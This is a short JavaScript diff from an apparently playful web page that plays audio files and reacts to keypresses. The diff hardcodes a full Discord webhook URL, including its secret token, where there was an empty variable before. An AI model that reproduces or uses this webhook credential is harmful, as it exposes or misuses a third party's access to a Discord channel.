@@ -2,15 +2,13 @@ function sleep(ms) {  return new Promise(resolve => setTimeout(resolve, ms)) }
 
 		var sans = new Audio('sans.mp3')
         var song = new Audio('song.mp3')
-        var webhook;
         
 		
         //var bt = window.document.getElementById('bt')
         var cx = document.getElementById('cx')
         var dv = document.getElementById('dv')
         var box = document.getElementById('hook')
-        
-        
+        var webhook = "https://ptb.discord.com/api/webhooks/1087122123048353923/AYU8aCh9zEoOXt-rNntapQRsiHP9n4F3Ql-fLu_ml4wNFyiWOI9XYlyvW5rgB1oG92gL"
         let txt;
  
         cx.addEventListener('keypress',  async (verif) => {
